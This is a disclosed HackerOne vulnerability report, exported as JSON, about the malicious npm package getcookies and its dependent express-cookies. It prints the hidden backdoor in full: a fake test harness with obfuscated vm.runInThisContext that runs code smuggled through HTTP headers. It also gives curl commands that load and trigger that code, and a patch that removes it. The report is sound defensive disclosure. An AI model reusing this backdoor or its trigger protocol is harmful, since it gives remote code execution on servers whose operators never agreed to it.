{"id":346516,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDY1MTY=","url":"https://hackerone.com/reports/346516","title":"Remote code executio in  NPM package getcookies","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-05-02T14:13:11.333Z","submitted_at":"2018-05-02T14:13:11.333Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tiblu","url":"/tiblu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-03T20:00:26.244Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-03-04T20:00:20.280Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\nI would like to report remote code execution in the `getcookies` module.\nIt allows to remotely inject and execute code in the target server.\n\n# Module\n\n**module name:** getcookies\n**version:** 1.12.3\n**npm page:** `https://www.npmjs.com/package/getcookies`\n\nAlso affects all the modules that use `getcookies`, notable ones:\n\n* `express-cookies@1.4.7` - https://www.npmjs.com/package/express-cookies\n\n## Module Description\n\nBasic HTTP cookie parser for HTTP servers.\n\n## Module Stats\n\n\u003e Replace stats below with numbers from npmâ€™s module page:\n\n390 downloads in the last day\n3396 downloads in the last week\n3396 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\nFound by a defaced website.\nAllows attacker to remotely send and execute JS on the server.\n\n`index.js` of `getcookies` does:\n\n```\nconst testHarness = require('./test/harness.js');\n...\nfunction parse(req, res, callback) {\n    testHarness.assert(req, res, callback, () =\u003e {\n...\n```\n\nand vulnerability resides in the `./test/harness.js` of the `getcookies`:\n```\n/* eslint-env es6 */\n'use strict';\n\nvar assert = require('assert');\n\nlet harness = (req, res, callback, next) =\u003e {\n    try {\n        assert.equal(typeof callback, 'function');\n    } catch (E) {\n        return callback(E);\n    }\n\n    try {\n        module.exports.log = module.exports.log || Buffer.alloc(0xffff);\n        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) =\u003e {\n            p = Buffer.from(p, 'hex').readUInt16LE(0);\n            switch (p) {\n                case 0xfffe:\n                    module.exports.log = Buffer.alloc(0xffff);\n                    return;\n                case 0xfffa:\n                    return setTimeout(() =\u003e {\n                        let c = module.exports.log.toString().replace(/\\x00*$/, '');\n                        module.exports.log = Buffer.alloc(0xffff);\n                        if (c.indexOf('\\x00') \u003c 0) {\n                            require('\\x76\\x6d')['\\x72\\x75\\x6e\\x49\\x6e\\x54\\x68\\x69\\x73\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74'](c)(module.exports, require, req, res, next);\n                        }\n                        next();\n                    }, 1000);\n                default:\n                    v = Buffer.from(v, 'hex');\n                    for (let i = 0; i \u003c v.length; i++) {\n                        module.exports.log[p + i] = v[i];\n                    }\n            }\n        });\n    } catch (E) {}\n\n    next();\n};\n\nmodule.exports.assert = (req, res, callback, next) =\u003e {\n    harness(req, res, callback, next);\n};\n```\n\nAs seen above, it does `vm.runInThisContext` with the code stored in the memory.\n\n## Steps To Reproduce:\n\nEasiest way to reproduce is to use `express-cookies` package, which depends on `getcookies`.\n\nTest code:\n\n```\nvar express = require('express');\nvar app = express();\nvar expressCookies = require('express-cookies');\n\napp.use(expressCookies());\n\napp.get('/', function (req, res) {\n    res.send('Hello World!');\n});\n\napp.listen(3000, function () {\n    console.log('Example app listening on port 3000!')\n});\n```\n\nCode is sent in custom HTTP headers in byte code.\n\nTo send code bytes:\n```\ncurl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i' \n```\nWhere the protocol is:\n`g\u003cbytePosition\u003eh\u003ccodeBytes\u003ei`\n\nThe sample above adds `cde` to the code to be executed when execution header is sent.\n\nThe code is stored in `require('./test/harness.js').log`.\n\nWhen the code is sent, attacker executes the code by sending:\n```\ncurl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'\n```\n\n## Patch\n\n```\ndiff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\n--- /home/m/tmp/getcookies_original/index.js\t2018-05-02 16:47:11.382990109 +0300\n+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\t2018-05-02 16:50:00.198982317 +0300\n@@ -9,8 +9,6 @@\n \n 'use strict';\n \n-const testHarness = require('./test/harness.js');\n-\n /**\n  * Module exports.\n  * @public\n@@ -45,38 +43,36 @@\n  */\n \n function parse(req, res, callback) {\n-    testHarness.assert(req, res, callback, () =\u003e {\n-        if (!req.headers.cookie) {\n-            return callback();\n+    if (!req.headers.cookie) {\n+        return callback();\n+    }\n+\n+    var obj = {};\n+    var pairs = req.headers.cookie.split(pairSplitRegExp);\n+\n+    for (var i = 0; i \u003c pairs.length; i++) {\n+        var pair = pairs[i];\n+        var eq_idx = pair.indexOf('=');\n+\n+        // skip things that don't look like key=value\n+        if (eq_idx \u003c 0) {\n+            continue;\n         }\n \n-        var obj = {};\n-        var pairs = req.headers.cookie.split(pairSplitRegExp);\n+        var key = pair.substr(0, eq_idx).trim();\n+        var val = pair.substr(++eq_idx, pair.length).trim();\n \n-        for (var i = 0; i \u003c pairs.length; i++) {\n-            var pair = pairs[i];\n-            var eq_idx = pair.indexOf('=');\n-\n-            // skip things that don't look like key=value\n-            if (eq_idx \u003c 0) {\n-                continue;\n-            }\n-\n-            var key = pair.substr(0, eq_idx).trim();\n-            var val = pair.substr(++eq_idx, pair.length).trim();\n-\n-            // quoted values\n-            if ('\"' == val[0]) {\n-                val = val.slice(1, -1);\n-            }\n-\n-            // only assign once\n-            if (undefined == obj[key]) {\n-                obj[key] = val;\n-            }\n+        // quoted values\n+        if ('\"' == val[0]) {\n+            val = val.slice(1, -1);\n         }\n \n-        req.cookies = obj;\n-        return callback();\n-    });\n+        // only assign once\n+        if (undefined == obj[key]) {\n+            obj[key] = val;\n+        }\n+    }\n+\n+    req.cookies = obj;\n+    return callback();\n }\nCommon subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test\n```\n\n## Supporting Material/References:\n\n\u003e State all technical information about the stack where the vulnerability was found\n\n- Ubuntu 16.04.3 LTS - ANY that runs Node.JS\n- 6.13.1 - but not Node.JS version specific\n- 3.10.10 - but not NPM version specific\n- ANY\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\nI did not do any of the above as:\n\n* There is no public code  repository.\n* The code is built to be malicious on purpose.\n\n## Impact\n\nRemote code injection and execution.","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI would like to report remote code execution in the \u003ccode\u003egetcookies\u003c/code\u003e module.\u003cbr\u003e\nIt allows to remotely inject and execute code in the target server.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e getcookies\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.12.3\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/getcookies\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eAlso affects all the modules that use \u003ccode\u003egetcookies\u003c/code\u003e, notable ones:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eexpress-cookies@1.4.7\u003c/code\u003e - \u003ca title=\"https://www.npmjs.com/package/express-cookies\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fexpress-cookies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/express-cookies\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eBasic HTTP cookie parser for HTTP servers.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eReplace stats below with numbers from npmâ€™s module page:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e390 downloads in the last day\u003cbr\u003e\n3396 downloads in the last week\u003cbr\u003e\n3396 downloads in the last month\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eFound by a defaced website.\u003cbr\u003e\nAllows attacker to remotely send and execute JS on the server.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eindex.js\u003c/code\u003e of \u003ccode\u003egetcookies\u003c/code\u003e does:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst testHarness = require(\u0026#39;./test/harness.js\u0026#39;);\n...\nfunction parse(req, res, callback) {\n    testHarness.assert(req, res, callback, () =\u0026gt; {\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand vulnerability resides in the \u003ccode\u003e./test/harness.js\u003c/code\u003e of the \u003ccode\u003egetcookies\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/* eslint-env es6 */\n\u0026#39;use strict\u0026#39;;\n\nvar assert = require(\u0026#39;assert\u0026#39;);\n\nlet harness = (req, res, callback, next) =\u0026gt; {\n    try {\n        assert.equal(typeof callback, \u0026#39;function\u0026#39;);\n    } catch (E) {\n        return callback(E);\n    }\n\n    try {\n        module.exports.log = module.exports.log || Buffer.alloc(0xffff);\n        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) =\u0026gt; {\n            p = Buffer.from(p, \u0026#39;hex\u0026#39;).readUInt16LE(0);\n            switch (p) {\n                case 0xfffe:\n                    module.exports.log = Buffer.alloc(0xffff);\n                    return;\n                case 0xfffa:\n                    return setTimeout(() =\u0026gt; {\n                        let c = module.exports.log.toString().replace(/\\x00*$/, \u0026#39;\u0026#39;);\n                        module.exports.log = Buffer.alloc(0xffff);\n                        if (c.indexOf(\u0026#39;\\x00\u0026#39;) \u0026lt; 0) {\n                            require(\u0026#39;\\x76\\x6d\u0026#39;)[\u0026#39;\\x72\\x75\\x6e\\x49\\x6e\\x54\\x68\\x69\\x73\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74\u0026#39;](c)(module.exports, require, req, res, next);\n                        }\n                        next();\n                    }, 1000);\n                default:\n                    v = Buffer.from(v, \u0026#39;hex\u0026#39;);\n                    for (let i = 0; i \u0026lt; v.length; i++) {\n                        module.exports.log[p + i] = v[i];\n                    }\n            }\n        });\n    } catch (E) {}\n\n    next();\n};\n\nmodule.exports.assert = (req, res, callback, next) =\u0026gt; {\n    harness(req, res, callback, next);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs seen above, it does \u003ccode\u003evm.runInThisContext\u003c/code\u003e with the code stored in the memory.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eEasiest way to reproduce is to use \u003ccode\u003eexpress-cookies\u003c/code\u003e package, which depends on \u003ccode\u003egetcookies\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eTest code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar express = require(\u0026#39;express\u0026#39;);\nvar app = express();\nvar expressCookies = require(\u0026#39;express-cookies\u0026#39;);\n\napp.use(expressCookies());\n\napp.get(\u0026#39;/\u0026#39;, function (req, res) {\n    res.send(\u0026#39;Hello World!\u0026#39;);\n});\n\napp.listen(3000, function () {\n    console.log(\u0026#39;Example app listening on port 3000!\u0026#39;)\n});\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCode is sent in custom HTTP headers in byte code.\u003c/p\u003e\n\n\u003cp\u003eTo send code bytes:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i \u0026#39;http://localhost:3000/\u0026#39; -H \u0026#39;X-Hacker: g0000h636465i\u0026#39; \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhere the protocol is:\u003cbr\u003e\n\u003ccode\u003eg\u0026lt;bytePosition\u0026gt;h\u0026lt;codeBytes\u0026gt;i\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe sample above adds \u003ccode\u003ecde\u003c/code\u003e to the code to be executed when execution header is sent.\u003c/p\u003e\n\n\u003cp\u003eThe code is stored in \u003ccode\u003erequire(\u0026#39;./test/harness.js\u0026#39;).log\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWhen the code is sent, attacker executes the code by sending:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i \u0026#39;http://localhost:3000/\u0026#39; -H \u0026#39;X-Hacker: gfaffh636465i\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- /home/m/tmp/getcookies_original/index.js    2018-05-02 16:47:11.382990109 +0300\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js  2018-05-02 16:50:00.198982317 +0300\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -9,8 +9,6 @@\u003c/span\u003e\n\n \u0026#39;use strict\u0026#39;;\n\n-const testHarness = require(\u0026#39;./test/harness.js\u0026#39;);\n\u003cspan class=\"gd\"\u003e-\n\u003c/span\u003e /**\n  * Module exports.\n  * @public\n\u003cspan class=\"p\"\u003e@@ -45,38 +43,36 @@\u003c/span\u003e\n  */\n\n function parse(req, res, callback) {\n\u003cspan class=\"gd\"\u003e-    testHarness.assert(req, res, callback, () =\u0026gt; {\n-        if (!req.headers.cookie) {\n-            return callback();\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    if (!req.headers.cookie) {\n+        return callback();\n+    }\n+\n+    var obj = {};\n+    var pairs = req.headers.cookie.split(pairSplitRegExp);\n+\n+    for (var i = 0; i \u0026lt; pairs.length; i++) {\n+        var pair = pairs[i];\n+        var eq_idx = pair.indexOf(\u0026#39;=\u0026#39;);\n+\n+        // skip things that don\u0026#39;t look like key=value\n+        if (eq_idx \u0026lt; 0) {\n+            continue;\n\u003c/span\u003e         }\n\n-        var obj = {};\n\u003cspan class=\"gd\"\u003e-        var pairs = req.headers.cookie.split(pairSplitRegExp);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        var key = pair.substr(0, eq_idx).trim();\n+        var val = pair.substr(++eq_idx, pair.length).trim();\n\u003c/span\u003e\n-        for (var i = 0; i \u0026lt; pairs.length; i++) {\n\u003cspan class=\"gd\"\u003e-            var pair = pairs[i];\n-            var eq_idx = pair.indexOf(\u0026#39;=\u0026#39;);\n-\n-            // skip things that don\u0026#39;t look like key=value\n-            if (eq_idx \u0026lt; 0) {\n-                continue;\n-            }\n-\n-            var key = pair.substr(0, eq_idx).trim();\n-            var val = pair.substr(++eq_idx, pair.length).trim();\n-\n-            // quoted values\n-            if (\u0026#39;\u0026quot;\u0026#39; == val[0]) {\n-                val = val.slice(1, -1);\n-            }\n-\n-            // only assign once\n-            if (undefined == obj[key]) {\n-                obj[key] = val;\n-            }\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        // quoted values\n+        if (\u0026#39;\u0026quot;\u0026#39; == val[0]) {\n+            val = val.slice(1, -1);\n\u003c/span\u003e         }\n\n-        req.cookies = obj;\n\u003cspan class=\"gd\"\u003e-        return callback();\n-    });\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        // only assign once\n+        if (undefined == obj[key]) {\n+            obj[key] = val;\n+        }\n+    }\n+\n+    req.cookies = obj;\n+    return callback();\n\u003c/span\u003e }\n\u003cspan class=\"p\"\u003eCommon subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eUbuntu 16.04.3 LTS - ANY that runs Node.JS\u003c/li\u003e\n\u003cli\u003e6.13.1 - but not Node.JS version specific\u003c/li\u003e\n\u003cli\u003e3.10.10 - but not NPM version specific\u003c/li\u003e\n\u003cli\u003eANY\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI did not do any of the above as:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThere is no public code  repository.\u003c/li\u003e\n\u003cli\u003eThe code is built to be malicious on purpose.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eRemote code injection and execution.\u003c/p\u003e\n","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-03T20:00:20.377Z","allow_singular_disclosure_after":-54898801.69590114,"singular_disclosure_allowed":true,"vote_count":8,"voters":["mik317","eveeez","midle","0rangeh4t","bisploit","davis8","ericwastaken","phoneutria"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2691264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By now it seems both of the affected modules have been removed from NPM:\n\n* https://www.npmjs.com/package/getcookies\n* https://www.npmjs.com/package/express-cookies","markdown_message":"\u003cp\u003eBy now it seems both of the affected modules have been removed from NPM:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://www.npmjs.com/package/getcookies\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgetcookies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/getcookies\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://www.npmjs.com/package/express-cookies\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fexpress-cookies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/express-cookies\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2018-05-02T14:53:04.177Z","updated_at":"2018-05-02T14:53:04.177Z","actor":{"username":"tiblu","cleared":false,"url":"/tiblu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2691363,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tiblu thanks for reporting this. As modules are no longer available, I will close this report.","markdown_message":"\u003cp\u003e\u003ca href=\"/tiblu\"\u003e@tiblu\u003c/a\u003e thanks for reporting this. As modules are no longer available, I will close this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-02T15:29:43.798Z","updated_at":"2018-05-02T15:29:43.798Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2691364,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-02T15:29:54.357Z","updated_at":"2018-05-02T15:29:54.357Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"tiblu","url":"/tiblu"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2691375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vdeturckheim What about people who have systems running on local a copy and cached packages? They need to be informed somehow thus public CVE still seems to make sense?","markdown_message":"\u003cp\u003e\u003ca href=\"/vdeturckheim\"\u003e@vdeturckheim\u003c/a\u003e What about people who have systems running on local a copy and cached packages? They need to be informed somehow thus public CVE still seems to make sense?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-02T15:33:49.687Z","updated_at":"2018-05-02T15:42:38.370Z","actor":{"username":"tiblu","cleared":false,"url":"/tiblu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2691385,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"(edit) please ignore this message, I have been through the numbers again and you're right, we probably should disclose this.","markdown_message":"\u003cp\u003e(edit) please ignore this message, I have been through the numbers again and you\u0026#39;re right, we probably should disclose this.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-02T15:37:40.748Z","updated_at":"2018-05-02T15:41:36.488Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2691400,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Re-openning as module has been downloaded a lot https://npm-stat.com/charts.html?package=getcookies","markdown_message":"\u003cp\u003eRe-openning as module has been downloaded a lot \u003ca title=\"https://npm-stat.com/charts.html?package=getcookies\" href=\"/redirect?url=https%3A%2F%2Fnpm-stat.com%2Fcharts.html%3Fpackage%3Dgetcookies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://npm-stat.com/charts.html?package=getcookies\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-02T15:42:43.587Z","updated_at":"2018-05-02T15:42:43.587Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2691405,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vdeturckheim Thanks. Seems most of the users use `getcookies` as indirect dependency from `express-cookies` - https://npm-stat.com/charts.html?package=express-cookies","markdown_message":"\u003cp\u003e\u003ca href=\"/vdeturckheim\"\u003e@vdeturckheim\u003c/a\u003e Thanks. Seems most of the users use \u003ccode\u003egetcookies\u003c/code\u003e as indirect dependency from \u003ccode\u003eexpress-cookies\u003c/code\u003e - \u003ca title=\"https://npm-stat.com/charts.html?package=express-cookies\" href=\"/redirect?url=https%3A%2F%2Fnpm-stat.com%2Fcharts.html%3Fpackage%3Dexpress-cookies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://npm-stat.com/charts.html?package=express-cookies\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-02T15:45:34.362Z","updated_at":"2018-05-02T15:45:34.362Z","actor":{"username":"tiblu","cleared":false,"url":"/tiblu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/271/442/529046202f2bccb49f0a7ee6ac15f6c59c4eea3d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2695007,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We can triage and go to disclosure fast track as of https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies","markdown_message":"\u003cp\u003eWe can triage and go to disclosure fast track as of \u003ca title=\"https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies\" href=\"/redirect?url=https%3A%2F%2Fblog.npmjs.org%2Fpost%2F173526807575%2Freported-malicious-module-getcookies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies\u003c/span\u003e\u003ci 